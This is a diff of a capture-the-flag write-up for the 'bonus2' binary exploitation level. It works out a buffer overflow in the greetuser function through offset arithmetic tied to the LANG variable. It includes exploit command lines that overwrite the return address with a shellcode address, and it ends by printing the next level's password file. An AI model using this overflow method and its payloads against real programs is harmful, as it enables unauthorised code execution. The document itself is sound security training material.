@@ -148,8 +148,29 @@ Undefined command: "".  Try "help".
 0xbffffe93 in little endian = \x93\xfe\xff\xbf
 
 Now we have our two offset for nl (18) and fi (23)
-So we can overwrite the return address of the main function with the address of the shellcode + 18 or 23.
+So we can overflow the buffer in greetuser function with the address of the shellcode + 18 or 23.
 We just have to put 40 bytes or more for the first argument, and adjust the second argument depending on the LANG variable.
 
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab		(fi)
+<-----------><--------------------------------------><------------------------------>
+	13 bytes 				40 bytes						32 bytes
+
+13 + 40 + 32 = 85 bytes --> We can write 85 bytes in the buffer.
+
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab		(nl)
+<-----------><--------------------------------------><------------------------------>
+	13 bytes				40 bytes						32 bytes
+
+So same thing for nl, we can write 85 bytes in the buffer.
+
+
+
+We now that in the greetuser function the buffer is :
+char var_4c[72]; ---> 0x080484a2 <+30>:	lea    -0x48(%ebp),%eax		--> -72 bytes
+So we have 72 bytes, but we can write 85, so we can overwrite the buffer, and put our shellcode with no problem.
+	
 ./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 18 + "\x93\xfe\xff\xbf"')		--> fi
 ./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "\x93\xfe\xff\xbf"')		--> nl
+
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
